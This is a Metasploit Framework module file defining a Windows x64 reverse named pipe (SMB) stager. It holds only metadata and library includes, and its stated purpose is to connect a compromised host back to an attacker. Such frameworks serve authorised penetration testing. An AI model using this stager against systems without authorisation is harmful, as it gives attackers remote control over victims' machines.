##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_named_pipe'
require 'msf/core/payload/windows/x64/reverse_named_pipe'

module MetasploitModule

  CachedSize = 421

  include Msf::Payload::Stager
  include Msf::Payload::Windows::ReverseNamedPipe_x64

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Windows x64 Reverse Named Pipe (SMB) Stager',
      'Description' => 'Connect back to the attacker via a named pipe pivot',
      'Author'      => ['OJ Reeves'],
      'License'     => MSF_LICENSE,
      'Handler'     => Msf::Handler::ReverseNamedPipe,
      'Platform'    => 'win',
      'Arch'        => ARCH_X64,
      'Convention'  => 'handlerdi',
      'Stager'      => { 'RequiresMidstager' => false }
    ))
  end

end
